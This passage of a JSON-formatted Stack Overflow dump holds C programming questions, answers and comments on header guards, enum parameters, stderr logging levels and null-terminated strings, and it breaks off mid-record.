mov    %ecx,-0xc(%rbp)\n    0x0000000100000f73 &lt;main+35&gt;:   pop    %rbp\n    0x0000000100000f74 &lt;main+36&gt;:   retq   \n    End of assembler dump.\n</code></pre>\n\n<p>I can safely assume that this line of assembly code:</p>\n\n<pre><code>  0x0000000100000f6a &lt;main+26&gt;:   add    $0x6,%ecx\n</code></pre>\n\n<p>correlates to this line of C:</p>\n\n<pre><code>     int b = a + 6;\n</code></pre>\n\n<p>But is there a way to extract which lines of assembly are associated to the specific line of C code?<br>\nIn this small sample it's not too difficult, but in larger programs and when debugging a larger amount of code it gets a bit cumbersome.</p>\n"}, {"tags": ["c", "struct"], "comments": [{"owner": {"reputation": 1613, "user_id": 6413048, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05e41c326a8c8c6240e3a8b71e806d58?s=128&d=identicon&r=PG&f=1", "display_name": "Tim", "link": "https://stackoverflow.com/users/6413048/tim"}, "edited": false, "score": 4, "creation_date": 1498041939, "post_id": 44673885, "comment_id": 76331762, "body": "Is it the full code of Parser.h ? If so you need to add something that prevents you from including it twice, like this : <code>#ifndef PARSER_H #define PARSER_H [...] #endif</code> . This is because each time you write <code>#include &quot;parser.h&quot;</code> your header will very simply be copy-pasted at this location. If you do it twice, without this #ifndef preprocessor guard, then you effectively declare the structure twice."}, {"owner": {"reputation": 323, "user_id": 7774587, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/bf87edf89e1b72ce5477a242d6cf5a11?s=128&d=identicon&r=PG&f=1", "display_name": "W.draoui", "link": "https://stackoverflow.com/users/7774587/w-draoui"}, "reply_to_user": {"reputation": 1613, "user_id": 6413048, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05e41c326a8c8c6240e3a8b71e806d58?s=128&d=identicon&r=PG&f=1", "display_name": "Tim", "link": "https://stackoverflow.com/users/6413048/tim"}, "edited": false, "score": 0, "creation_date": 1498041985, "post_id": 44673885, "comment_id": 76331798, "body": "No I will put the full parser.h. I can&#39;t for other files because they are very long. Can you now tell me how to correct the problem because I think what you are saying makes a lot of sense but i dont understand it very well"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 41796, "user_id": 1870232, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/rbI29.jpg?s=128&g=1", "display_name": "P0W", "link": "https://stackoverflow.com/users/1870232/p0w"}, "edited": false, "score": 0, "creation_date": 1498042241, "post_id": 44673885, "comment_id": 76331989, "body": "@P0W It is a duplicate, but I think this question demonstrates the problem much more clearly. It may be that your found duplicate should be closed with a link to this one, and not the other way around."}, {"owner": {"reputation": 41796, "user_id": 1870232, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/rbI29.jpg?s=128&g=1", "display_name": "P0W", "link": "https://stackoverflow.com/users/1870232/p0w"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498042419, "post_id": 44673885, "comment_id": 76332103, "body": "@Lundin five year old post duplicate of future post :D I have removed my vote though."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 41796, "user_id": 1870232, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/rbI29.jpg?s=128&g=1", "display_name": "P0W", "link": "https://stackoverflow.com/users/1870232/p0w"}, "edited": false, "score": 0, "creation_date": 1498042577, "post_id": 44673885, "comment_id": 76332205, "body": "@P0W Yes. The age is completely irrelevant when determining which post to close. We are only concerned with the quality of the questions and the answers. Given any number of duplicates, the best one should be preserved. Not the oldest one."}, {"owner": {"reputation": 323, "user_id": 7774587, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/bf87edf89e1b72ce5477a242d6cf5a11?s=128&d=identicon&r=PG&f=1", "display_name": "W.draoui", "link": "https://stackoverflow.com/users/7774587/w-draoui"}, "reply_to_user": {"reputation": 41796, "user_id": 1870232, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/rbI29.jpg?s=128&g=1", "display_name": "P0W", "link": "https://stackoverflow.com/users/1870232/p0w"}, "edited": false, "score": 0, "creation_date": 1498042585, "post_id": 44673885, "comment_id": 76332212, "body": "@P0W Why not? :D"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498042683, "post_id": 44673885, "comment_id": 76332278, "body": "As it turns out, we do need a canonical duplicate for this very question, as it is a FAQ. The linked one is not good, the question there is too specific and the answers don&#39;t explain <i>why</i> the error appears."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1498042782, "post_id": 44673885, "comment_id": 76332340, "body": "Related: <a href=\"https://stackoverflow.com/q/27810115/694576\">stackoverflow.com/q/27810115/694576</a>"}], "answers": [{"comments": [{"owner": {"reputation": 4031, "user_id": 7640269, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/szGUJ.png?s=128&g=1", "display_name": "danglingpointer", "link": "https://stackoverflow.com/users/7640269/danglingpointer"}, "edited": false, "score": 0, "creation_date": 1498044086, "post_id": 44673999, "comment_id": 76333226, "body": "How about using <code>#pragma once</code>, is it bad practice? I thought this is for the lazy ones who don&#39;t want to type two additional lines."}, {"owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "edited": false, "score": 0, "creation_date": 1498044763, "post_id": 44673999, "comment_id": 76333686, "body": "you can use  #pragma once  but some compilers don&#39;t know about this macros"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 4031, "user_id": 7640269, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/szGUJ.png?s=128&g=1", "display_name": "danglingpointer", "link": "https://stackoverflow.com/users/7640269/danglingpointer"}, "edited": false, "score": 1, "creation_date": 1498045674, "post_id": 44673999, "comment_id": 76334367, "body": "@LethalProgrammer Yes it is bad practice since it is non-portable."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 2, "last_activity_date": 1498042167, "creation_date": 1498042167, "answer_id": 44673999, "question_id": 44673885, "link": "https://stackoverflow.com/questions/44673885/c-redefinition-of-struct/44673999#44673999", "title": "C : redefinition of \u2018struct&#39;", "body": "<p>The problem here is that during compilation, interface.c + all its included headers form a \"translation unit\". But since two of the headers both include parser.h, it will appear as if the contents in that header is declared twice.</p>\n\n<p>To avoid problems like these, you should <em>always</em> use so-called \"header guards\" in every single header file you write:</p>\n\n<pre><code>#ifndef PARSER_H  // header guard\n#define PARSER_H\n\nstruct ParsedAuthResponse {\n   char *name;\n   char *key;\n};\n\nstruct ParsedInfoResponse {\n   char *name;\n   char *message;\n};\n\n...\n\n#endif // PARSER_H\n</code></pre>\n\n<p>This ensures that the contents are only visible once per translation unit.</p>\n"}, {"comments": [{"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 1, "creation_date": 1498043227, "post_id": 44674009, "comment_id": 76332641, "body": "FYI, in case it&#39;s not clear, you should do this for every header file (with a different <code>#define</code> name obvs). in fact most programmers configure their editor to automatically add such in whenever they create a new header file."}], "tags": [], "owner": {"reputation": 1613, "user_id": 6413048, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05e41c326a8c8c6240e3a8b71e806d58?s=128&d=identicon&r=PG&f=1", "display_name": "Tim", "link": "https://stackoverflow.com/users/6413048/tim"}, "is_accepted": true, "score": 7, "last_activity_date": 1498042198, "creation_date": 1498042198, "answer_id": 44674009, "question_id": 44673885, "link": "https://stackoverflow.com/questions/44673885/c-redefinition-of-struct/44674009#44674009", "title": "C : redefinition of \u2018struct&#39;", "body": "<p>You need to add a guard that prevents Parser.h to be included twice, like this : </p>\n\n<pre><code>#ifndef PARSER_H\n#define PARSER_H\nstruct ParsedAuthResponse {\n   char *name;\n   char *key;\n};\n\nstruct ParsedInfoResponse {\n   char *name;\n   char *message;\n};\nvoid auth_parser(char* serverResponse,struct ParsedAuthResponse *response_a);\nvoid scrobble_parser(char* serverResponse, int* scrobbleParsedparsedResponse);\nvoid love_unlove_parser(char* serverResponse, int* loveUnloveParsedResponse);\nvoid getInfo_parser(char* serverResponse,struct ParsedInfoResponse *responseP);\n#endif\n</code></pre>\n\n<p>Because each time you write the instruction <code>#include \"Parser.h\"</code> the content of Parser.h will simply be copy-pasted at the include location. This means that you will have both structures declared twice. </p>\n\n<p>With the <code>ifndef</code> you prevent it from being copy-pasted more than once.  </p>\n"}], "owner": {"reputation": 323, "user_id": 7774587, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/bf87edf89e1b72ce5477a242d6cf5a11?s=128&d=identicon&r=PG&f=1", "display_name": "W.draoui", "link": "https://stackoverflow.com/users/7774587/w-draoui"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7057, "favorite_count": 0, "closed_date": 1498042804, "accepted_answer_id": 44674009, "answer_count": 2, "score": 3, "last_activity_date": 1498042198, "creation_date": 1498041815, "last_edit_date": 1498042013, "question_id": 44673885, "link": "https://stackoverflow.com/questions/44673885/c-redefinition-of-struct", "closed_reason": "Duplicate", "title": "C : redefinition of \u2018struct&#39;", "body": "<p>I'm in trouble with the Warning redefinition of struct.\nTo explain my problem I will consider 4 files.</p>\n\n<ul>\n<li>Interface.c</li>\n<li>Parser.h</li>\n<li>Auth.h</li>\n<li>Info.h</li>\n</ul>\n\n<p><strong>Interface.c</strong></p>\n\n<pre><code>    #include \"Auth.h\"\n    #include \"Info.h\"\n\n/* some code here */\n</code></pre>\n\n<p><strong>Parser.h</strong></p>\n\n<pre><code>struct ParsedAuthResponse {\n   char *name;\n   char *key;\n};\n\nstruct ParsedInfoResponse {\n   char *name;\n   char *message;\n};\nvoid auth_parser(char* serverResponse,struct ParsedAuthResponse *response_a);\nvoid scrobble_parser(char* serverResponse, int* scrobbleParsedparsedResponse);\nvoid love_unlove_parser(char* serverResponse, int* loveUnloveParsedResponse);\nvoid getInfo_parser(char* serverResponse,struct ParsedInfoResponse *responseP);\n</code></pre>\n\n<p><strong>Auth.h</strong></p>\n\n<pre><code>#include \"parser.h\"\nfunctionX(int a, struct ParsedAuthResponse *response);\n/* some code here */\n</code></pre>\n\n<p><strong>Info.h</strong></p>\n\n<pre><code>#include \"parser.h\"\nfunctionY(int a, struct ParsedInfoResponse *response);\n/* some code here */\n</code></pre>\n\n<p>When I don't include Info.h or Auth.h in Interface.c there is no problem.</p>\n"}, {"tags": ["c", "enums"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498040277, "post_id": 44673228, "comment_id": 76330563, "body": "We are not a tutoring/consulting service. Do you have a specific problem with your code? As a sidenote: consider using different functions or passing a function pointer. A single, complicated function to do different, unrelated things welcomes maintenance problems and is harder to debug."}, {"owner": {"reputation": 539, "user_id": 2805824, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tBgwo.gif?s=128&g=1", "display_name": "Gaurav Pathak", "link": "https://stackoverflow.com/users/2805824/gaurav-pathak"}, "edited": false, "score": 0, "creation_date": 1498040496, "post_id": 44673228, "comment_id": 76330715, "body": "Instead of <code>if</code> <code>else</code> you can go with <code>switch</code> <code>case</code>. I am just suggesting. Otherwise, it&#39;s perfectly okay."}], "answers": [{"tags": [], "owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "is_accepted": true, "score": 2, "last_activity_date": 1498040424, "creation_date": 1498040424, "answer_id": 44673373, "question_id": 44673228, "link": "https://stackoverflow.com/questions/44673228/should-i-use-an-enum-argument-to-determine-function/44673373#44673373", "title": "Should I use an enum argument to determine function?", "body": "<p>Seems like a fine reason to use <code>enums</code>. The one thing I think would be done differently, is that rather than using a series of <code>if</code>, <code>else if</code>, <code>else</code> statements you use a <code>switch</code> statement like this:</p>\n\n<pre><code>switch(type)\n  {\ncase maximum:\n   ...\nbreak;\ncase average:\n   ...\nbreak;\n  }\n</code></pre>\n\n<p>Might also be worth changing the capitalisation of the <code>emum</code> values so they look less like variables too ie <code>Maximum</code>, <code>Average</code> etc...</p>\n"}], "owner": {"reputation": 21, "user_id": 8193468, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/878a60064f6be806b59f86c4b74f070c?s=128&d=identicon&r=PG&f=1", "display_name": "Shrouded", "link": "https://stackoverflow.com/users/8193468/shrouded"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "closed_date": 1498047046, "accepted_answer_id": 44673373, "answer_count": 1, "score": -2, "last_activity_date": 1498050938, "creation_date": 1498040059, "last_edit_date": 1498050938, "question_id": 44673228, "link": "https://stackoverflow.com/questions/44673228/should-i-use-an-enum-argument-to-determine-function", "closed_reason": "Needs details or clarity", "title": "Should I use an enum argument to determine function?", "body": "<p>So basically I use enums to indicate the purpose of a function.</p>\n\n<p>I have a function and I want it to behave differently in some cases but I want to specify it as a parameter, so that it is readable to other people. Is it okay to use enums in this way? Or am I supposed to do in a different way?</p>\n\n<p>Example:</p>\n\n<pre><code>enum ShredType {\n    maximum,\n    minimum,\n    average \n};\n</code></pre>\n\n<p>and function body:</p>\n\n<pre><code>void ShredDataToBarPlot(double* dataArray, int arraySize, int shredInterval,\n    enum ShredType type)\n{\n    if(NULL != dataArray &amp;&amp; arraySize &gt; shredInterval)\n    {\n        for(int i = 0; i&lt;getSignalSize()/2;i+=shredInterval)\n        {\n            if(type == maximum)\n            {\n              do something\n            }\n            else if (type == average)\n            {\n            do something else\n            }\n           ...\n</code></pre>\n\n<p>And the function call example is:</p>\n\n<pre><code>ShredDataToBarPlot(someArray, someArraySize, someInterval, maximum);\n</code></pre>\n\n<p>You could translate my question to:\nIs this a correct usage of enums? Am I not extending their original purpose? Will this way of parametrizing a function not confuse other people? \nI don't want to learn bad habits on my early journey of programming. If this question was inappropriate for stackoverflow please pm me where I can ask such questions.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1498038648, "post_id": 44672595, "comment_id": 76329406, "body": "There is a convention of printing out the &quot;stack trace&quot; that&#39;s grown up over the years. Not so trivial in C though."}, {"owner": {"reputation": 539, "user_id": 2805824, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tBgwo.gif?s=128&g=1", "display_name": "Gaurav Pathak", "link": "https://stackoverflow.com/users/2805824/gaurav-pathak"}, "edited": false, "score": 2, "creation_date": 1498038895, "post_id": 44672595, "comment_id": 76329575, "body": "<code>err_lvl_1</code> and <code>err_lvl_2</code> are not warning information level. I guess you need to implement your custom log level print function."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1498048073, "post_id": 44672595, "comment_id": 76336186, "body": "You might want to create a <i>complete, working program</i> in this style, and post it over at <a href=\"https://codereview.stackexchange.com\">Code Review</a>. Be sure to read <a href=\"//codereview.meta.stackexchange.com/a/5778\">A guide to Code Review for Stack Overflow users</a> first, as some things are done differently over there!"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498058238, "post_id": 44672595, "comment_id": 76344474, "body": "Note that the <code>err_lvl_2</code> message isn&#39;t going to stop your program from crashing when it tries to use the null pointer \u2014 though the context of testing immediately after assigning null to the pointer is moot (usually, you&#39;d make the test to check a memory allocation, or something similar). This is somewhat tangential to your question. You should call a function other than <code>fprintf()</code> with more information (file, line, function, problem text or code) and you can arrange for that logging function to behave &#39;appropriately&#39; \u2014 it might write to a log file, to standard error, to syslog, to /dev/null\u2026"}], "answers": [{"tags": [], "owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "is_accepted": false, "score": 1, "last_activity_date": 1498041429, "creation_date": 1498041429, "answer_id": 44673741, "question_id": 44672595, "link": "https://stackoverflow.com/questions/44672595/what-level-should-i-print-warning-information-to-stderr/44673741#44673741", "title": "What level should I print warning information to stderr?", "body": "<p>Actually, these messages are not very informative. You want to be able to spot where something went wrong &ndash; and what. Therefor you don't need error levels at all. Imagine you see \"err_lvl_1\" on the console, but you used it at numerous different locations in your application...</p>\n\n<p>You are better off giving more concrete information such as:</p>\n\n<pre><code>fprintf(stderr, \"(%4u) %s: p == NULL\\n\", __LINE__, __func__);\n</code></pre>\n\n<p>You could place this into a macro such that you get uniform logging:</p>\n\n<pre><code>#define LOG(FORMAT, ...) \\\n    fprintf(stderr, \"(%4u) %s: \" FORMAT \"\\n\", __LINE__, __func__, ## __VA_ARGS__);\n\nLOG(\"value of x was %d\", x);\n</code></pre>\n\n<p>(Be aware that <code>##</code> above is a GCC extension for the case there are no variadic arguments, which will then skip the comma &ndash; other compilers might require different solution...)</p>\n\n<p>Sure, you can select more cryptic wording, trying to hide internals to the user, as long as you quickly get from what you need...</p>\n\n<p>Levels, if available, typically are used to switch more verbose logging on (or off), either at compile time or when your programme runs (or both combined, such as below):</p>\n\n<pre><code>#define LEVEL_NONE  0\n#define LEVEL_FATAL 1\n#define LEVEL_ERROR 2\n// WARNING, INFO, DEBUG, TRACE, ...\n\n#if STATIC_LOG_LEVEL &lt; LEVEL_ERROR\n#define LOG_ERROR(FORMAT, ...)\n#else\n#define LOG_ERROR(FORMAT, ...)               \\\n    do                                       \\\n    {                                        \\\n        if(currentLevel &gt;= LEVEL_ERROR)      \\\n            fprintf(stderr, \"(%4u) %s: \" FORMAT \"\\n\", __LINE__, __func__, ## __VA_ARGS__) \\\n    }                                        \\\n    while(0)\n#endif\n</code></pre>\n\n<p>Instead of printing to stderr, you might print to a file instead &ndash; et voil\u00e0, you just started some minimal logging system... You don't need to invent it up right from the start, though, there are enough of them out there already, such as <a href=\"http://log4c.sourceforge.net/\" rel=\"nofollow noreferrer\">log4c</a>, for instance (don't ask me if its good, though &ndash; try it, if you don't like it, look for another... &ndash; or if you like, continue what I started above).</p>\n\n<p>Why switching levels at all? Well, as long as everything runs fine, you might want to have less logging (for better performance, smaller log files, ...), but while developing/testing your application or in the case that soemthing went wrong later, you might want to have more verbose logging to track the error down...</p>\n"}], "owner": {"reputation": 19, "user_id": 8100778, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/7198a4b3447b0bab65304407a88a2e9a?s=128&d=identicon&r=PG&f=1", "display_name": "mlin", "link": "https://stackoverflow.com/users/8100778/mlin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1498059078, "creation_date": 1498038483, "last_edit_date": 1498059078, "question_id": 44672595, "link": "https://stackoverflow.com/questions/44672595/what-level-should-i-print-warning-information-to-stderr", "title": "What level should I print warning information to stderr?", "body": "<p>While I do C programming, I'd like to print out some warnings for special case in order to make the program more robustly. However, I usually meet situation like:</p>\n\n<pre><code>float a(...) {\n    float *p = NULL;\n    if (p == NULL) fprintf(stderr, \"err_lvl_2\");\n    ...;\n}\n\nfloat *b(...) {\n    float *p;\n    ...;\n    p = Cal(...); \n    if (p == NULL) fprintf(stderr, \"err_lvl_1\");\n    ...\n    return p;\n}\n</code></pre>\n\n<p>The warning information <code>err_lvl_1</code> and <code>err_lvl_2</code> are nearly the same? I think it's a little bit annoying. It will be worse if more high level nesting used. But I don't know at which level I should do this printing best.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1498038256, "post_id": 44672462, "comment_id": 76329128, "body": "Are you sure you&#39;re creating a valid C string?"}, {"owner": {"reputation": 4031, "user_id": 7640269, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/szGUJ.png?s=128&g=1", "display_name": "danglingpointer", "link": "https://stackoverflow.com/users/7640269/danglingpointer"}, "edited": false, "score": 2, "creation_date": 1498038326, "post_id": 44672462, "comment_id": 76329189, "body": "String is null terminated in C."}, {"owner": {"reputation": 539, "user_id": 2805824, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tBgwo.gif?s=128&g=1", "display_name": "Gaurav Pathak", "link": "https://stackoverflow.com/users/2805824/gaurav-pathak"}, "edited": false, "score": 0, "creation_date": 1498038362, "post_id": 44672462, "comment_id": 76329213, "body": "Either index issue or the string is not NULL terminated."}, {"owner": {"reputation": 1, "user_id": 7871802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6c32d41cba1fe78e5e61c1b42a5242f9?s=128&d=identicon&r=PG&f=1", "display_name": "killer", "link": "https://stackoverflow.com/users/7871802/killer"}, "edited": false, "score": 0, "creation_date": 1498038453, "post_id": 44672462, "comment_id": 76329274, "body": "i don&#39;t know what&#39;s null terminated string im new can you guys please explain"}, {"owner": {"reputation": 539, "user_id": 2805824, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tBgwo.gif?s=128&g=1", "display_name": "Gaurav Pathak", "link": "https://stackoverflow.com/users/2805824/gaurav-pathak"}, "edited": false, "score": 0, "creation_date": 1498038537, "post_id": 44672462, "comment_id": 76329337, "body": "@killer You just need to add <code>str[i] = &#39;\\0&#39;;</code> outside the while loop before <code>printf</code>."}, {"owner": {"reputation": 1, "user_id": 7871802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6c32d41cba1fe78e5e61c1b42a5242f9?s=128&d=identicon&r=PG&f=1", "display_name": "killer", "link": "https://stackoverflow.com/users/7871802/killer"}, "edited": false, "score": 0, "creation_date": 1498038603, "post_id": 44672462, "comment_id": 76329381, "body": "ok thanks brother probleme solved"}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498038797, "post_id": 44672462, "comment_id": 76329507, "body": "in the first iteration consider str[j+1]=str[j]...j=i=-1. j+1=0. so it means you are doing str[0]=str[-1]. .. this is wrong. You can&#39;t have negative indices for an array"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "reply_to_user": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498038941, "post_id": 44672462, "comment_id": 76329613, "body": "@VidorVistrom When <code>j</code> is <code>-1</code>, the body of the loop is not executed because the condition is <code>j&gt;-1</code>."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498039488, "post_id": 44672462, "comment_id": 76330056, "body": "@bluepixy...ahh..i missed that"}], "answers": [{"tags": [], "owner": {"reputation": 10492, "user_id": 603688, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/1058344e1b119c4d9dd3aedc5456277b?s=128&d=identicon&r=PG", "display_name": "Dan", "link": "https://stackoverflow.com/users/603688/dan"}, "is_accepted": false, "score": 1, "last_activity_date": 1498038543, "creation_date": 1498038543, "answer_id": 44672625, "question_id": 44672462, "link": "https://stackoverflow.com/questions/44672462/how-to-print-a-string-in-c-without-p-in-the-end-of-the-string/44672625#44672625", "title": "how to print a string in c without p\u2510 in the end of the string", "body": "<p>At the end of your <code>do {} while ()</code> loop, you need to set the character after the last character in your string to <code>0</code>. This is the array index of the last character you want (<code>i</code>) plus one. This lets <code>printf</code> know where your string ends. (Otherwise, how could it know?)</p>\n"}, {"tags": [], "owner": {"reputation": 1156, "user_id": 4597023, "user_type": "registered", "profile_image": "https://graph.facebook.com/1089025404457164/picture?type=large", "display_name": "riodoro1", "link": "https://stackoverflow.com/users/4597023/riodoro1"}, "is_accepted": false, "score": 2, "last_activity_date": 1498047372, "last_edit_date": 1498047372, "creation_date": 1498038800, "answer_id": 44672727, "question_id": 44672462, "link": "https://stackoverflow.com/questions/44672462/how-to-print-a-string-in-c-without-p-in-the-end-of-the-string/44672727#44672727", "title": "how to print a string in c without p\u2510 in the end of the string", "body": "<p>In C and C++, strings are null-terminated, this means that every valid string must end with a character with code 0. This character tells every function that is dealing with this string that it is in fact over.</p>\n\n<p>In your program you create a string, <code>signed char str[256];</code> and it is initially filled with random data; this means that you reserved space for 256 characters and they are all garbage, but the system does not know they are invalid. Try printing this string and see what happens.</p>\n\n<p>In order to actually tell the system that your string is over after say, 8 characters, the 9th character hast to be the NUL character, or simply 0. In your code you can do it in two ways:</p>\n\n<ul>\n<li>after the loop, assign <code>str[i] = 0</code>, or (even simpler)</li>\n<li>initialize the string as <code>signed char str[256]={0};</code>, whiche creates the storage and fills it with nulls; after writing to the string you can be sure that the character after the last one you've written will be a NUL.</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 1602, "user_id": 1815837, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b095ab1b2554345af93b82b7a9c02f0?s=128&d=identicon&r=PG", "display_name": "skr", "link": "https://stackoverflow.com/users/1815837/skr"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1498046595, "post_id": 44672788, "comment_id": 76335047, "body": "Yes it is not the same. Thank you Toby."}], "tags": [], "owner": {"reputation": 1602, "user_id": 1815837, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b095ab1b2554345af93b82b7a9c02f0?s=128&d=identicon&r=PG", "display_name": "skr", "link": "https://stackoverflow.com/users/1815837/skr"}, "is_accepted": false, "score": 0, "last_activity_date": 1498046568, "last_edit_date": 1498046568, "creation_date": 1498038954, "answer_id": 44672788, "question_id": 44672462, "link": 